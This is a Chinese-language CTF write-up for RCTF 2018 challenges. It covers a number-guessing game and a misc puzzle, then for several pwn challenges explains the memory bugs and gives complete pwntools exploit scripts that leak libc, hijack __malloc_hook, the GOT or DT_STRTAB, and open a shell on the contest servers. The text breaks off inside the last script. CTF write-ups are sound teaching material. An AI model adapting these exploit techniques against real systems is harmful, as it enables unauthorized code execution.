<p>Give me 4 numbers, in[0, 10), You can only try 6 times</p>
<p><a href="https://github.com/AustinGuo/GessNumber" target="_blank" rel="noopener">https://github.com/AustinGuo/GessNumber</a><br>脚本可以生成每关结果，然后半自动玩游戏23333</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/4c4908ebc3b82ac6238fd66afc6589d7.png?raw=true" alt></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/f9708038d6e6b7d0ab66c1904333d700.png?raw=true" alt></p>
<h3 id="520gift"><a href="#520gift" class="headerlink" title="520gift"></a><strong>520gift</strong></h3><p>找出美妆博主：</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/38c8c75e5339fe38e6f0988c08a2fbd7.png?raw=true" alt></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/b3281fd10858de25b21222735d1a5e03.png?raw=true" alt></p>
<p>flag：<strong>RCTF{rbdlmlombrslj}</strong></p>
<h2 id="0x02-Pwn"><a href="#0x02-Pwn" class="headerlink" title="0x02 Pwn"></a>0x02 Pwn</h2><h3 id="BabyHeap"><a href="#BabyHeap" class="headerlink" title="BabyHeap"></a><strong>BabyHeap</strong></h3><p>最基础的off by null</p>
<p>chunk overlap + fastbin attack 极限利用…..做起来很不舒服……</p>
<p>思路首先是利用off by null来chunk overlap ， chunk overlap之后利用fast bin<br>attack来get shell，基本上全是套路………<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">'./babyheap'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">	context.log_level=<span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'babyheap.2018.teamrois.cn'</span>,<span class="number">3154</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">	se(<span class="string">'1\n'</span>)</span><br><span class="line">	ru(<span class="string">'please input chunk size:'</span>)</span><br><span class="line">	se(str(sz)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'input chunk content:'</span>)</span><br><span class="line">	se(content)</span><br><span class="line">	ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	se(<span class="string">'2\n'</span>)</span><br><span class="line">	ru(<span class="string">'please input chunk index:'</span>)</span><br><span class="line">	se(str(idx)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'content: '</span>)</span><br><span class="line">	data=ru(<span class="string">'1. '</span>)</span><br><span class="line">	ru(<span class="string">'choice:'</span>)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	se(<span class="string">'3\n'</span>)</span><br><span class="line">	ru(<span class="string">'please input chunk index:'</span>)</span><br><span class="line">	se(str(idx)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------init----------------</span></span><br><span class="line">alloc(<span class="number">0x48</span>,<span class="string">'0\n'</span>)</span><br><span class="line">alloc(<span class="number">0xf9</span>,(p64(<span class="number">0x100</span>)+p64(<span class="number">0x21</span>))*<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0xa8</span>,<span class="string">'2'</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)*<span class="number">10</span>+<span class="string">'\n'</span>)</span><br><span class="line">alloc(<span class="number">0x100</span>,<span class="string">'3\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------off by null-------------</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------chunk overlap--------</span></span><br><span class="line">alloc(<span class="number">0x88</span>,<span class="string">'1\n'</span>)</span><br><span class="line">alloc(<span class="number">0x68</span>,<span class="string">'4\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak libc----------------</span></span><br><span class="line">alloc(<span class="number">0x88</span>,<span class="string">'1\n'</span>)</span><br><span class="line"></span><br><span class="line">libc=u64(show(<span class="number">4</span>)[:<span class="number">6</span>]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">base=libc<span class="number">-0x3C4B78</span></span><br><span class="line"></span><br><span class="line">malloc_hook=base+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------fast bin attack-----------</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0xa8</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+p64(<span class="number">0x71</span>)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0xa8</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line">alloc(<span class="number">0x68</span>,<span class="string">'t\n'</span>)</span><br><span class="line">alloc(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(base+<span class="number">0xf1147</span>)*<span class="number">2</span>+p64(base+<span class="number">0x846D0</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">print(hex(base+<span class="number">0x846D0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>flag: <strong>RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58}</strong></p>
<h3 id="simulator"><a href="#simulator" class="headerlink" title="simulator"></a><strong>simulator</strong></h3><p>这是一个mips的指令模拟器，先输入mips的汇编代码，然后会解析成二进制，之后根据二进制来执行对应的操作，在主函数那里貌似有一个栈溢出，但是leak不出来cookie…….</p>
<p>基本操作有这些，syscall 只实现了一个，就是print int，感觉可以利用lw<br>和sw进行任意地址读写</p>
<p>然后将 ___stack_chk_fail 的got 写改成 ret 的地址，就可以用栈溢出随便玩了</p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/2d4bbc0310f5f97ce15c1e45996656d8.png?raw=true" alt></p>
<p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/4953625cac69b7d60dd6c1ba1febd22a.png?raw=true" alt></p>
<p>漏洞点在这里，没有判断小于0的情况</p>
<p>li \$a0,1883262208<br>li \$a1,1883262209<br>add \$a0,\$a0,\$a1<br>lw \$a0,\$a0</p>
<p>li \$v0,1</p>
<p>syscall</p>
<p>END</p>
<p>利用这个payload可以打印got中某个地址的值</p>
<p>这里可以劫持控制流</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">li $a0,1883262209</span><br><span class="line">li $a1,1883262210</span><br><span class="line">add $a1,$a0,$a1</span><br><span class="line">move $a0,$a1</span><br><span class="line">lw $a0,$a0</span><br><span class="line">li $v0,1</span><br><span class="line">syscall</span><br><span class="line">move $a0,$a1</span><br><span class="line">li $v0,134523991</span><br><span class="line">sw $v0,$a0</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>输完这个payload之后，就可以栈溢出</p>
<p>弄了半天ret2dlresolve，然后发现找libc快多了……….</p>
<p>下面是payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">rop=roputils.ROP(<span class="string">'./simulator'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">'simulator'</span>)</span><br><span class="line">	context.log_level=<span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	e=ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.24.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'simulator.2018.teamrois.cn'</span>, <span class="number">3131</span>)</span><br><span class="line">	e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line">s=string.letters+string.digits</span><br><span class="line"><span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">	chal=p.recv(<span class="number">16</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(s,<span class="number">4</span>):</span><br><span class="line">    	sol=<span class="string">''</span>.join(i)</span><br><span class="line">    	<span class="keyword">if</span> sha256(chal + sol).digest().startswith(<span class="string">'\0\0\0'</span>):</span><br><span class="line">        	<span class="keyword">break</span></span><br><span class="line">	p.send(sol)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'''</span></span><br><span class="line"><span class="string">li $a0,1883262209</span></span><br><span class="line"><span class="string">li $a1,1883262210</span></span><br><span class="line"><span class="string">add $a1,$a0,$a1</span></span><br><span class="line"><span class="string">move $a0,$a1</span></span><br><span class="line"><span class="string">lw $a0,$a0</span></span><br><span class="line"><span class="string">li $v0,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">move $a0,$a1</span></span><br><span class="line"><span class="string">li $v0,134523991</span></span><br><span class="line"><span class="string">sw $v0,$a0</span></span><br><span class="line"><span class="string">END</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">puts=<span class="number">0x080485C0</span></span><br><span class="line">main_addr=<span class="number">0x804AC23</span></span><br><span class="line">bss_tmp=<span class="number">0x804DB20</span>+<span class="number">0x100</span></span><br><span class="line">pret=<span class="number">0x804B33B</span></span><br><span class="line"></span><br><span class="line">tpayload=<span class="string">'a'</span>*<span class="number">44</span>+p32(bss_tmp)+p32(puts)+p32(main_addr)+p32(<span class="number">0x0804D010</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'leave a comment: '</span>)</span><br><span class="line">se(tpayload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">printf=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">base=printf-e.symbols[<span class="string">'printf'</span>]</span><br><span class="line"></span><br><span class="line">system=base+e.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh=base+e.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">rpayload=<span class="string">'a'</span>*<span class="number">48</span>+p32(system)+p32(binsh)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">se(rpayload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>flag: <strong>RCTF{5imu_s1mu_sinnu_siml_l_simulator!_7a3dac}</strong></p>
<h3 id="RNote3"><a href="#RNote3" class="headerlink" title="RNote3"></a><strong>RNote3</strong></h3><p>漏洞在delete那里…..未初始化变量……看了栈溢出那里半天….难受</p>
<p>delete函数未初始化变量，所以可以delete 任意一块地方</p>
<p>具体是先view了某一个想delete的堆，然后堆地址保存在栈上，然后这个时候进delete函数，随便输一个东西，然后因为找不到对应的堆，然后<br>i 这个时候是31，但是free的是栈上面的那个变量，所以可以use after<br>free，之后一个fastbin attack过去就可以了</p>
<p>payload 如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">'RNote3'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">	context.log_level=<span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'rnote3.2018.teamrois.cn'</span>,<span class="number">7322</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(title,sz,content)</span>:</span></span><br><span class="line">	se(<span class="string">'1\n'</span>)</span><br><span class="line">	ru(<span class="string">'please input title:'</span>)</span><br><span class="line">	se(title)</span><br><span class="line">	ru(<span class="string">'please input content size:'</span>)</span><br><span class="line">	se(str(sz)+<span class="string">'\n'</span>)</span><br><span class="line">	ru(<span class="string">'please input content:'</span>)</span><br><span class="line">	se(content)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(title)</span>:</span></span><br><span class="line">	se(<span class="string">'2\n'</span>)</span><br><span class="line">	ru(<span class="string">'please input note title: '</span>)</span><br><span class="line">	se(title)</span><br><span class="line">	ru(<span class="string">'note content: '</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(title,content)</span>:</span></span><br><span class="line">	se(<span class="string">'3\n'</span>)</span><br><span class="line">	ru(<span class="string">'please input note title:'</span>)</span><br><span class="line">	se(title)</span><br><span class="line">	ru(<span class="string">'please input new content: '</span>)</span><br><span class="line">	se(content)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(title)</span>:</span></span><br><span class="line">	se(<span class="string">'4\n'</span>)</span><br><span class="line">	ru(<span class="string">'please input note title: '</span>)</span><br><span class="line">	se(title)</span><br><span class="line">	sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="string">'1\n'</span>,<span class="number">0xa0</span>,<span class="string">'a\n'</span>)</span><br><span class="line">add(<span class="string">'2\n'</span>,<span class="number">0xa0</span>,<span class="string">'b\n'</span>)</span><br><span class="line">show(<span class="string">'1\n'</span>)</span><br><span class="line">delete(<span class="string">'a\n'</span>)</span><br><span class="line">show(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">base=libc<span class="number">-0x3C4B78</span></span><br><span class="line"></span><br><span class="line">malloc_hook=base+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">'3\n'</span>,<span class="number">0xa0</span>,<span class="string">'c\n'</span>)</span><br><span class="line">add(<span class="string">'4\n'</span>,<span class="number">0x68</span>,<span class="string">'d\n'</span>)</span><br><span class="line">add(<span class="string">'5\n'</span>,<span class="number">0x68</span>,<span class="string">'e\n'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">'4\n'</span>)</span><br><span class="line">delete(<span class="string">'a\n'</span>)</span><br><span class="line">edit(<span class="string">'\n'</span>,p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="string">'6\n'</span>,<span class="number">0x68</span>,<span class="string">'f\n'</span>)</span><br><span class="line">add(<span class="string">'7\n'</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(base+<span class="number">0x4526a</span>)*<span class="number">2</span>+p64(base+<span class="number">0x846D0</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'1\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>flag:<strong>RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}</strong></p>
<h3 id="RNote4"><a href="#RNote4" class="headerlink" title="RNote4"></a><strong>RNote4</strong></h3><p>堆溢出，可以变成任意写…</p>
<p>然后改掉DT_STRTAB的值，改到bss段的一个地方，之后往上面放system，然后delete掉一个堆，这个时候会调用free，然后因为free是第一次被调用，会调用dl_resolve来找在libc中的地址<br>，因为改了DT_STRTAB，所以会找到sysytem，变成调用system(“/bin/sh”);，之后就get<br>shell了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p=process(<span class="string">'RNote4'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">	context.log_level=<span class="string">'debug'</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'rnote4.2018.teamrois.cn'</span>,<span class="number">6767</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">	se(<span class="string">'\x01'</span>)</span><br><span class="line">	se(chr(sz))</span><br><span class="line">	se(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,sz,content)</span>:</span></span><br><span class="line">	se(<span class="string">'\x02'</span>)</span><br><span class="line">	se(chr(idx))</span><br><span class="line">	se(chr(sz))</span><br><span class="line">	se(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	se(<span class="string">'\x03'</span>)</span><br><span class="line">	se(chr(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,content)</span>:</span></span><br><span class="line">	payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x18</span>)+p64(addr)</span><br><span class="line">	edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">	edit(<span class="number">1</span>,len(content),content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'b'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x601EB0</span>,p64(<span class="number">0x602100</span>))</span><br><span class="line">write(<span class="number">0x602100</span>,<span class="string">'a'</span>*<span class="number">0x5F</span>+<span class="string">'system'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>flag:<strong>RCTF{I_kn0w_h0w_dl_f1xup_w0rks_503f8c}</strong></p>
<h3 id="stringer"><a href="#stringer" class="headerlink" title="stringer"></a><strong>stringer</strong></h3><p>readstr 末尾不会强制+0</p>
<p>*(_BYTE *)(size - 1 + p) = 0;</p>
<p>根据size 来，可leak</p>
<p>calloc 会清空原来chunk上的内容,libc 2.23 设置 is_mmap bit 可以绕过</p>
<p>del 有 uaf</p>
<p>结合起来 构造 overlap + uaf</p>
<p>使用 edit 功能可以构造出来一个 overlap</p>
<p>有对齐。改最后一个 byte是不行的了，尝试第二个byte</p>
<p>almost</p>
<p>get it</p>
<p>思路</p>
<p>edit 修改 fastbin 的第二个byte 造成偏移</p>
<p>在偏移位置写一个 fake fastbin</p>
<p>libc 2.23 版本 calloc的时候如果 is_mmap bit 被设置了，不会清空</p>
<p>使用fake fastbin 修改一个 unsorted bin 的size 造成overlap</p>
<p>后面就是 leak 然后fastbin attack 的常规套路了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 